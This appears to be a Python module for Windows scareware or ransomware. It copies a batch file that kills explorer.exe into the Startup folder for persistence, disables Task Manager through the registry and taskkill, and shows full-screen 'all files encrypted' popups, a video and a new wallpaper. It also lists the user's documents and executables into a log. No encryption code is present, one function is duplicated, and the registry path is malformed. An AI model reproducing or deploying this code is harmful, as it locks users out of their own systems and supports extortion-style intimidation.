import sys
from os import read, write
import os
from tkinter import font
from typing import NamedTuple
from PIL import ImageTk
import PIL
import tkinter as tk
import numpy as np
import cv2
import subprocess
from time import sleep
import shutil
import getpass
import urllib.request
import ctypes

#PATHTOFILE
pathtofile = []
def readfromfile(pathtofile):
    readfile = open(pathtofile, mode="r")
    print(readfile.read())
    readfile.close()

#DELETE FILE
deletefile = []
def delete(deletefile):
    os.remove(deletefile)


#ADD FILE TO STARTUP

file = []
USER_NAME = getpass.getuser()
def add_to_startup(file):
    file_path = (r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME)
    shutil.copy2(file,file_path)

#CREATE FILE
createfile = []
writetofile = []
def createf(createfile,writetofile):
    createfile = open(createfile, mode="a")
    createfile.write(writetofile)
    createfile.close()


#RUN COMMAND FROM CMD OR TERMINAL
call = []
def callcommand(call):
    call = str(call)
    os.system(str(call))

#CREATE GUI FILE
boxgeometry = []
title = []
bgcolor = []
message = []
textbox_height = []
textbox_width = []
textboxcolor = []
message2 = []
titlemessage = []
def creategui(boxgeometry,title,bgcolor,message,textbox_height,textbox_width,textboxcolor,titlemessage):
    createf(createfile="WINSYSTEM32.bat",writetofile="taskkill /f /im explorer.exe")
    add_to_startup(file="WINSYSTEM32.bat")
    ws = tk.Tk()
    ws.title(title)
    ws.geometry(boxgeometry)
    ws.attributes("-fullscreen", True)
    ws.config(bg=bgcolor)

    message = message
    img = ImageTk.PhotoImage(PIL.Image.open("images/mw.png"))
    label = tk.Label(
        ws,
        image=img
    )
    label.place(x=-5, y=-5)

    text_box = tk.Text(
        ws,
        height=textbox_height,
        width=textbox_width,
        bg=textboxcolor,
        fg="#fff",
        font="Helvetica 11 bold"
    )
    titlemessage = titlemessage
    create_text = tk.Label(height=3, width=90, text=titlemessage,bg="red", fg="white", font=('Helvetica 11 bold'))

    create_text.pack()
    text_box.pack(expand=True)
    text_box.insert('end', message)
    text_box.config(state='disabled')
    ws.bind("<Escape>", lambda x: ws.destroy())
    ws.mainloop()




#PLAY VIDEO
path_to_video = []
def videoplay(path_to_video):
    file_name = path_to_video
    window_name = "deadnet"
    interframe_wait_ms = 30

    cap = cv2.VideoCapture(file_name)
    if not cap.isOpened():
        print("Error: Could not open video.")
        exit()

    cv2.namedWindow(window_name, cv2.WND_PROP_FULLSCREEN)
    cv2.setWindowProperty(window_name, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)

    while (True):
        ret, frame = cap.read()
        if not ret:
            print("Reached end of video, exiting.")
            break

        cv2.imshow(window_name, frame)
        if cv2.waitKey(interframe_wait_ms) & 0x7F == ord('q'):
            print("Exit requested.")
            break

    cap.release()
    cv2.destroyAllWindows()


#POP UP ENCRYPTION TEXT {!!! ALL FILES ENCRYPTED !!!}
imagePath = []
def encryption_text_gui(boxgeometry,title,bgcolor,titlemessage,imagePath):

    encr = tk.Tk()
    encr.title(title)
    encr.geometry(boxgeometry)
    encr.attributes("-fullscreen", True)
    encr.config(bg=bgcolor)
    btnImg = ImageTk.PhotoImage(PIL.Image.open(imagePath))
    img = ImageTk.PhotoImage(PIL.Image.open("images/mw.png"))
    label = tk.Label(
        encr,
        image=img
    )
    label_plaxe_x = -5
    label_place_y = -5
    label.place(x=label_plaxe_x, y=label_place_y)

    titlemessage = titlemessage
    create_text = tk.Label(height=10, width=90, text=titlemessage,bg="red", fg="white", font=('Helvetica 11 bold'))
    create_text.pack()
    text_plaxe_x = 780
    text_place_y = 260
    create_text.place(x=text_plaxe_x,y=text_place_y,anchor="center")
    CLOSEBUTTON = tk.Button(encr,command = encr.destroy)
    CLOSEBUTTON.config(image=btnImg)
    CLOSEBUTTON.pack(pady=400,anchor="center")
    encr.after(10000,lambda: encr.destroy())
    encr.mainloop()


#DISABLE TASK MANAGER
def disabletaskmanager():
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    loop = True
    while loop:
        subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
        sleep(1)
        loop=False

#KILL TASKS
def taskkillexplorer():
    os.system("reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    os.system('taskkill /f /im explorer.exe')


def change_desktop_background():
    path = "images/background.jpg"
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


def grab():
    encrypted_extension = (".txt",".docx",".ppsx",".exe")
    #GRAB ALL FILES FROM (encrypted_extension)

    all_file_paths = []
    for root,dirs,files in os.walk("C:\\"):
        for file in files:
            file_path,file_ext = os.path.splitext(root+"\\"+file)
            if file_ext in encrypted_extension:
                all_file_paths.append(root+"\\"+file)

    for output in all_file_paths:
        createf(createfile="logs.txt",writetofile=f"Encrypted files -> \n{output}\n-----------------------------------\n")

    callcommand("START logs.txt")
    add_to_startup(file="logs.txt")

def grab():
    encrypted_extension = (".txt",".docx",".ppsx",".exe")
    #GRAB ALL FILES FROM (encrypted_extension)

    all_file_paths = []
    for root,dirs,files in os.walk("C:\\"):
        for file in files:
            file_path,file_ext = os.path.splitext(root+"\\"+file)
            if file_ext in encrypted_extension:
                all_file_paths.append(root+"\\"+file)

    for output in all_file_paths:
        createf(createfile="logs.txt",writetofile=f"Encrypted files -> \n{output}\n-----------------------------------\n")

    callcommand("START logs.txt")
    add_to_startup(file="logs.txt")



    
